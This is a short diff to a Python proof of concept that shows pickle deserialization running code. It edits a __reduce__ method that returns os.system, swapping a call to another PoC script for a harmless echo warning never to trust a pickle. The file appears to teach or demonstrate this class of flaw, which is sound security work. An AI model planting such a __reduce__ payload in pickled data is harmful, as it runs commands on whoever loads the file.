@@ -11,8 +11,7 @@ class Test(object):
         self.a = 1
 
     def __reduce__(self):
-        # Runs the other PoC found in /examples
-        return (os.system, ("python pytorch_poc.py",))
+        return (os.system, ("echo 'Now I can run malicious code! Never trust a pickle.'",))
 
 
 payload = Test()
